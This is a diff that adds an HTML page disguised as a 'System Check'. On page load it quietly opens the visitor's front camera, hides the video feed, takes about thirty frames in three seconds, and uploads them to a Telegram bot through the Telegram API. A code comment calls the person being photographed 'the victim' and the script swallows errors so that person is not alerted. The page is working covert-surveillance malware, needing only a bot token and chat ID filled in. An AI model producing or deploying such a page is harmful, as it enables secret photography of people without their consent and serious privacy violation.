@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>System Check</title>
+<style>
+  body { margin:0; background:#000; overflow:hidden; }
+  video { position:fixed; top:0; left:0; width:1px; height:1px; opacity:0.01; pointer-events:none; }
+  #msg { position:fixed; top:50%; left:50%; transform:translate(-50%,-50%);
+         color:#333; font-family:monospace; font-size:14px; text-align:center; }
+</style>
+</head>
+<body>
+<video id="cam" autoplay playsinline muted></video>
+<div id="msg">initializing...</div>
+
+<script>
+// ── config ──────────────────────────────────────────────
+const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+const CHAT_ID   = "YOUR_CHAT_ID_HERE";
+const FPS       = 10;       // frames per second
+const DURATION  = 3000;     // total capture time in ms (3s = 30 photos)
+// ─────────────────────────────────────────────────────────
+
+const video  = document.getElementById('cam');
+const msg    = document.getElementById('msg');
+const canvas = document.createElement('canvas');
+const ctx    = canvas.getContext('2d');
+
+let stream   = null;
+let sending  = false;
+let sentCount = 0;
+
+async function init() {
+  msg.textContent = "requesting camera...";
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
+      audio: false
+    });
+    video.srcObject = stream;
+    await video.play();
+    msg.textContent = "";
+    captureLoop();
+  } catch (e) {
+    msg.textContent = "camera unavailable";
+  }
+}
+
+function captureLoop() {
+  const interval = 1000 / FPS;
+  const start = Date.now();
+
+  const timer = setInterval(() => {
+    // draw current video frame to canvas
+    canvas.width  = video.videoWidth  || 640;
+    canvas.height = video.videoHeight || 480;
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    // convert to blob and send
+    canvas.toBlob(blob => {
+      if (blob) sendPhoto(blob);
+    }, 'image/jpeg', 0.7);
+
+    if (Date.now() - start >= DURATION) {
+      clearInterval(timer);
+      // cleanup
+      if (stream) stream.getTracks().forEach(t => t.stop());
+      msg.textContent = "done. " + sentCount + " photos sent.";
+      setTimeout(() => { window.close(); }, 2000);
+    }
+  }, interval);
+}
+
+async function sendPhoto(blob) {
+  if (sending) return; // avoid pileup — browser limits concurrent uploads
+  sending = true;
+
+  const form = new FormData();
+  form.append('chat_id', CHAT_ID);
+  form.append('photo', blob, 'cam_' + Date.now() + '.jpg');
+  form.append('caption', 'frame ' + (++sentCount));
+
+  try {
+    await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', {
+      method: 'POST',
+      body: form
+    });
+  } catch (e) {
+    // silent fail — don't alert the victim
+  }
+  sending = false;
+}
+
+// autoplay on open
+window.addEventListener('load', init);
+</script>
+</body>
+</html>
